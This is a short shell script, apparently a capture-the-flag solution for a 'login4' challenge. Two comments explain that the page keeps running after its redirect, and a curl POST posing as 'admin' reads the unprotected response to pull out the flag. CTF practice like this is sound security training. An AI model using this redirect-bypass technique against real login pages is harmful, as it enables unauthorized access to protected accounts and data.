#!/bin/sh

echo "Notice that it didn't exit after redirect"
echo "So if we can somehow \"deny\" the redirect and see the original page, we can get the flag"
curl https://ctf.hackme.quest/login4/ -X POST -d "name=admin" 2>/dev/null | grep -o "FLAG{.*}" --color=never
